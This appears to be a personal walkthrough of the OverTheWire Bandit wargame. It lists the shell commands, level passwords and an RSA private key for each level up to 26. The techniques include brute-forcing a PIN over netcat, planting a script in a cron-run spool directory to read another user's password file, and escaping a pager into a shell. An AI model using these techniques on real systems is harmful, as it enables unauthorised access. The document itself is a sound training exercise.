@@ -1,0 +1,323 @@
+
+
+ssh bandit0@bandit.labs.overthewire.org -p 2220
+password: bandit0
+
+$:ll
+$: cat readme
+boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+$: 
+
+
+ssh bandit1@bandit.labs.overthewire-org -p 2220
+password:
+
+
+$:ll
+$: cat ./-
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+
+ssh bandit2
+
+$:ll
+$:cat [tab]
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+
+ssh bandit3
+
+$:cd inhere/
+$:cat .hidden
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+
+ssh bandit4
+
+$: cd inhere/
+$: file ./*
+$: found ascii text in -file07
+$: cat ./-file07
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+
+ssh bandit5
+
+$: cd inhere/
+$: for d in ./*/ ; do (cd "$d" && ls -laH ./*); done
+$: for d in ./*/ ; do (cd "$d" && file ./*); done
+
+$: find ./ -type f -size 1033c
+$: found in maybehere07/.file2
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+ssh bandit6
+$: find / -type f -size 33c -group bandit6
+$: /var/lib/dpkg/info/bandit7.password
+
+
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+
+ssh bandit7
+$: cat data.txt | grep -i "millionth"
+cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+
+ssh bandit8
+
+$: strings data.txt | uniq | sort |awk '{a[$0]++}END{for(i in a)if(a[i]<2)print i}'
+
+$: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+
+
+ssh bandit9
+bandit9@bandit:~$ strings data.txt | grep -i "==="
+========== the
+========== password
+========== is
+========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+
+
+ssh bandit10
+
+bandit10@bandit:~$ base64 -d < data.txt
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+
+
+ssh bandit11
+
+bandit11@bandit:~$ strings data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
+The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+
+
+ssh bandit12
+
+bandit12@bandit:/tmp/dataa$ history
+    1  ls
+    2  cat data.txt 
+    3  file *
+    4  cp data.txt /tmp/
+    5  cd /tmp/
+    6  ls
+    7  mkdir dataa
+    8  mv data.txt dataa
+    9  cd dataa
+   10  ls
+   11  cat data.txt 
+   12  xxd -r data.txt 
+   13  xxd -r data.txt changed
+   14  ls
+   15  file changed 
+   16  gzip -d changed
+   17* l
+   18  gzip --help
+   19  mv  changed changed.gz
+   20  gzip -d changed.gz 
+   21  lsa
+   22  ls
+   23  file *
+   24  tar -xvf changed
+   25  ls
+   26  file changed 
+   27  tar -xvf changed
+   28  file *
+   29  bzip --help
+   30  bz
+   31  bzip2
+   32  bzip2 --help
+   33  bzip2 -d changed
+   34  ls
+   35  file changed.out 
+   36  mv changed changed.gz
+   37  mv changed.out changed.gz
+   38  gzip -d changed.gz
+   39  file *
+   40  tar -xvf changed
+   41  ls
+   42  cat data5.bin 
+   43  file data5.bin 
+   44  tar xvf data5.bin
+   45  file data6
+   46  file data6.bin 
+   47  bzip2 -d data6.bin
+   48  ls
+   49  file data6
+   50  file data6.bin.out 
+   51  tar xvf data6.bin.out
+   52  file data8
+   53  file data8.bin 
+   54  mv data8.bin data8.gz
+   55  gzip -d data8.gz 
+   56  ls
+   57  file data8 
+   58  cat data8
+
+bandit12@bandit:/tmp/dataa$ cat data8 
+The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+
+ssh bandit13
+
+$: ssh -i sshkey.private bandit14@localhost
+bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+ssh bandit14
+
+bandit14@bandit:~$ netcat localhost 30000
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+Correct!
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+
+ssh bandit15
+
+bandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof
+
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+Correct!
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+
+ssh bandit16
+
+$: nmap -sT localhost -p 31000-32000
+$: openssl s_client -connect localhost:31790 -ign_eof
+
+---
+cluFn7wTiGryunymYOu4RcffSxQluehd
+Correct!
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+copy paste to /tmp/mykey.pem
+$: chmod 600 mykey.pem
+$: # permission must be rw only for the owner
+$: ssh -i mykey.pem bandit17@localhost
+$: cat /etc/bandit_pass/bandit17
+xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+
+
+ssh bandit17
+$: diff password.old password.new
+kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+ssh bandit18
+$: ssh -t bandit17@localhost /bin/sh
+$: cat readme
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+
+ssh bandit19
+
+$:./bandit20-do USER=bandit20 cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+ssh bandit20
+$: cat /etc/bandit_pass/bandit20 | nc -l 1881 &
+$: ./suconnect 1881
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+
+ssh bandit 21
+
+$: cd /etc/cron.d
+    5  cat cronjob_bandit22
+    6  cat /usr/bin/cronjob_bandit22.sh
+    7  cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+
+ssh bandit 22
+bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+
+ssh bandit 23
+
+$: mkdir /tmp/a
+$: cd /tmp/a
+$: vim /tmp/a/getpass.txt
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/a/gotpass.txt
+cp /etc/bandit_pass/bandit24 /tmp/a/
+chmod 777 /tmp/a/bandit24
+
+$: chmod 777 /tmp/a && chmod 777 /tmp/a/getpass.sh
+$: cp /tmp/a/getpass.sh /var/spool/bandit/24/
+$: watch "cat /var/spool/bandit24/getpass.sh"
+$: # when it is not found
+$: cat /tmp/a/bandit24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+ssh bandit 24
+
+$: vim a.py
+passwd= "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+
+for i in range(1000,10000):
+	print  passwd + " " + str(i)
+
+
+$: python a.py >> answers
+$: cat answers  | nc localhost 30002 >> rst
+$: sort rst | uniq -u
+
+Correct!
+Exiting.
+I am the pincode checker for user bandit25. Please 
+enter the password for user bandit24 and the secret 
+pincode on a single line, separated by a space.
+The password of user bandit25 is 
+
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+ssh bandit 25
+shell env == /bin/more
+set terminal to 50x3
+press v to open vi
+then :set shell=/bin/sh 
+(it is temporary)
+then :!cat /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+then :!/bin/sh
+
+$ cat README.txt
+Congratulations on solving the last level of this game!
+
+At this moment, there are no more levels to play in this game. However, we are constantly working
+on new levels and will most likely expand this game with more levels soon.
+Keep an eye out for an announcement on our usual communication channels!
+In the meantime, you could play some of our other wargames.
+
+If you have an idea for an awesome new level, please let us know!
+
+
